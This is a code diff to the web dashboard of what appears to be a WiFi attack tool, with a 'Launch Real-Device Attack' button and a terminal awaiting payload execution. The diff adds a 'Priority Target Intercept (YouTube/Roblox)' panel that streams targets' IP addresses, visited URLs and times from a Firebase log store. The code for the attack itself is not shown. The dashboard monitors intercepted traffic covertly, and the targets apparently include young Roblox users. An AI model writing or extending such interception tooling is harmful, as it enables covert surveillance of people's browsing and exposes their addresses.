@@ -120,6 +120,14 @@
     <div id="wifiTerminal" class="w-full h-48 bg-black border border-red-900/30 p-3 mb-4 overflow-y-auto font-mono text-[10px] shadow-inner">
         <div class="text-gray-600">[SYSTEM] Terminal ready. Awaiting payload execution...</div>
     </div>
+    <div class="mt-6 border-2 border-red-600 bg-black p-4">
+    <h2 class="text-red-600 font-black text-xs tracking-tighter mb-3 uppercase">
+        ⚠️ Priority Target Intercept (YouTube/Roblox)
+    </h2>
+    <div id="priorityTerminal" class="h-40 overflow-y-auto font-mono text-[10px] space-y-2">
+        <div class="text-gray-500 italic">Waiting for targets...</div>
+    </div>
+</div>
 
     <button onclick="executeWifiAttack()" class="w-full bg-red-600 hover:bg-red-700 text-white py-2 uppercase font-black text-[10px] tracking-widest transition-all">
         Launch Real-Device Attack
@@ -217,6 +225,26 @@
   const db = getDatabase(app);
   const logsRef = ref(db, 'logs');
   const terminal = document.getElementById('wifiTerminal');
+
+  const priorityRef = ref(db, 'priority_logs');
+const priorityTerminal = document.getElementById('priorityTerminal');
+
+onChildAdded(priorityRef, (snapshot) => {
+    const data = snapshot.val();
+    // Очищаем надпись "Waiting", если пришел первый лог
+    if(priorityTerminal.innerText.includes('Waiting')) priorityTerminal.innerHTML = '';
+
+    const entry = document.createElement('div');
+    entry.className = 'bg-red-900/20 border-l-4 border-red-600 p-2 animate-pulse';
+    entry.innerHTML = `
+        <div class="flex justify-between">
+            <span class="text-red-500 font-bold uppercase">${data.target}</span>
+            <span class="text-white text-[9px]">${data.time}</span>
+        </div>
+        <div class="text-gray-300 text-[9px]">${data.ip} | ${data.url}</div>
+    `;
+    priorityTerminal.prepend(entry); // Новые логи будут СВЕРХУ
+});
 
   // ФУНКЦИЯ ОЧИСТКИ (и на экране, и в базе!)
   window.clearLogs = async function() {
